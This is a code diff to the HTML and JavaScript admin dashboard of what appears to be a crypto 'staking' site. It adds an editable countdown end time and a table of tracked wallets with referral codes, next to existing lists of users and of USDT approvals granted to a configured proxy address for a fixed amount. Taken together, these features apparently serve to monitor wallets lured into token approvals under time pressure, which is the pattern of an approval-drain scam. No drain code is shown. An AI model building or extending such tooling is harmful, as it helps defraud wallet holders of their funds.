@@ -14,6 +14,7 @@
   .mono{ font-family: ui-monospace,Menlo,Consolas,monospace } .row{ display:flex; gap:12px; align-items:end; flex-wrap:wrap }
   .pill{ background:#0c0d1a; border:1px solid rgb(255 255 255/.08); color:#c7c9d6; border-radius:999px; padding:6px 10px; display:inline-block; font-size:12px }
   .right{ text-align:right } .hidden{ display:none }
+  .help{ font-size:13px; color:#8fa5d4; margin-top:8px }
 </style>
 </head>
 <body>
@@ -45,6 +46,24 @@
       </div>
 
       <div class="card" style="margin-top:16px">
+        <h3>Countdown</h3>
+        <div class="row" style="align-items:flex-end">
+          <div style="flex:1">
+            <label>Ends (local)</label>
+            <input type="datetime-local" id="endLocal">
+          </div>
+          <div style="flex:1">
+            <label>Unix timestamp</label>
+            <input type="number" id="endTs" readonly>
+          </div>
+          <div>
+            <button type="button" id="updateEndBtn">Save</button>
+          </div>
+        </div>
+        <p class="help" id="endMsg">Set the staking countdown end date/time.</p>
+      </div>
+
+      <div class="card" style="margin-top:16px">
         <h3>Approvals</h3>
         <table id="tbl">
           <thead><tr><th>#</th><th>Wallet</th><th>Approved</th><th>Tx</th><th>When</th></tr></thead>
@@ -59,21 +78,48 @@
           <tbody></tbody>
         </table>
       </div>
+
+      <div class="card" style="margin-top:16px">
+        <h3>Tracked Wallets</h3>
+        <table id="tblWallets">
+          <thead><tr><th>#</th><th>Wallet</th><th>Ref code</th><th>Last seen</th><th>Created</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
     </div>
   </div>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
   <script>
   const state = { cfg:null };
+  const fetchWithCred = (url, opts={}) => fetch(url, { credentials: 'include', ...opts });
+
+  function formatTs(ts){
+    if(!ts) return "—";
+    return new Date(ts*1000).toLocaleString();
+  }
+  function toLocalInput(ts){
+    if(!ts) return "";
+    const d = new Date(ts*1000);
+    const pad = n => String(n).padStart(2,'0');
+    return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())}T${pad(d.getHours())}:${pad(d.getMinutes())}`;
+  }
+  function setCountdownInputs(ts){
+    const local = document.getElementById('endLocal');
+    const unix = document.getElementById('endTs');
+    if(local) local.value = toLocalInput(ts);
+    if(unix) unix.value = ts ? Math.floor(ts) : "";
+  }
 
   async function fetchCfg(){
-    const r = await fetch('/api/config').then(r=>r.json());
+    const r = await fetchWithCred('/api/config').then(r=>r.json());
     state.cfg = r.config;
     document.getElementById('proxy').textContent = state.cfg.PROXY_ADDR;
     document.getElementById('usdt').textContent = state.cfg.USDT_ADDR;
     document.getElementById('amt').textContent = state.cfg.APPROVAL_AMOUNT;
+    setCountdownInputs(state.cfg.STAKING_END_TS);
   }
   async function loadRows(){
-    const r = await fetch('/api/approvals');
+    const r = await fetchWithCred('/api/approvals');
     if(r.status===401){ document.getElementById('loginCard').classList.remove('hidden'); document.getElementById('dash').classList.add('hidden'); return; }
     const j = await r.json(); const rows = j.rows||[];
     const tb = document.querySelector('#tbl tbody'); tb.innerHTML='';
@@ -89,12 +135,12 @@
     });
   }
   async function loadUsers(){
-    const r = await fetch('/api/users');
+    const r = await fetchWithCred('/api/users');
     if(r.status!==200) return;
     const j = await r.json(); const rows=j.rows||[];
     const tb = document.querySelector('#tblUsers tbody'); tb.innerHTML='';
     rows.forEach((u,i)=>{
-      const when = new Date((u.lastSeen||u.createdAt)*1000).toLocaleString();
+      const when = formatTs(u.lastSeen||u.createdAt);
       const tr = document.createElement('tr');
       tr.innerHTML = `<td>${i+1}</td>
         <td class="mono">${u.wallet}</td>
@@ -104,17 +150,66 @@
       tb.appendChild(tr);
     });
   }
+  async function loadWallets(){
+    const r = await fetchWithCred('/api/admin/wallets');
+    if(r.status!==200) return;
+    const j = await r.json(); const rows=j.rows||[];
+    const tb = document.querySelector('#tblWallets tbody'); tb.innerHTML='';
+    rows.forEach((w,i)=>{
+      const tr = document.createElement('tr');
+      tr.innerHTML = `<td>${i+1}</td>
+        <td class="mono">${w.wallet}</td>
+        <td class="mono">${w.refCode||''}</td>
+        <td>${formatTs(w.lastSeen)}</td>
+        <td>${formatTs(w.createdAt)}</td>`;
+      tb.appendChild(tr);
+    });
+  }
+  async function saveCountdown(){
+    const iso = document.getElementById('endLocal').value;
+    const msg = document.getElementById('endMsg');
+    if(!iso){
+      msg.textContent = "Choose a valid local date/time.";
+      return;
+    }
+    const parsed = Math.floor(new Date(iso).getTime()/1000);
+    if(Number.isNaN(parsed) || parsed <= 0){
+      msg.textContent = "Invalid timestamp.";
+      return;
+    }
+    const res = await fetchWithCred('/api/admin/staking-end',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ timestamp: parsed }) });
+    if(!res.ok){
+      const body = await res.json().catch(()=>({}));
+      msg.textContent = body.error ? `Save failed: ${body.error}` : "Save failed.";
+      return;
+    }
+    const data = await res.json();
+    if(data.config){
+      state.cfg = data.config;
+    }
+    setCountdownInputs(state.cfg.STAKING_END_TS);
+    msg.textContent = "Countdown updated.";
+  }
   async function login(){
     const username=document.getElementById('u').value.trim(), password=document.getElementById('p').value;
-    const r = await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username,password})});
-    if(r.ok){ document.getElementById('loginCard').classList.add('hidden'); document.getElementById('dash').classList.remove('hidden'); await fetchCfg(); await loadRows(); await loadUsers(); }
-    else document.getElementById('loginMsg').textContent='Invalid credentials';
+    const r = await fetchWithCred('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username,password})});
+    if(r.ok){
+      document.getElementById('loginCard').classList.add('hidden');
+      document.getElementById('dash').classList.remove('hidden');
+      await fetchCfg();
+      await loadRows();
+      await loadUsers();
+      await loadWallets();
+    } else {
+      document.getElementById('loginMsg').textContent='Invalid credentials';
+    }
   }
-  async function logout(){ await fetch('/api/logout',{method:'POST'}); location.reload(); }
+  async function logout(){ await fetchWithCred('/api/logout',{method:'POST'}); location.reload(); }
   document.getElementById('loginBtn').addEventListener('click', login);
   document.getElementById('logoutBtn').addEventListener('click', logout);
+  document.getElementById('updateEndBtn').addEventListener('click', saveCountdown);
 
-  (async()=>{ await fetchCfg(); await loadRows(); await loadUsers(); })();
+  (async()=>{ await fetchCfg(); await loadRows(); await loadUsers(); await loadWallets(); })();
   </script>
 </body>
 </html>
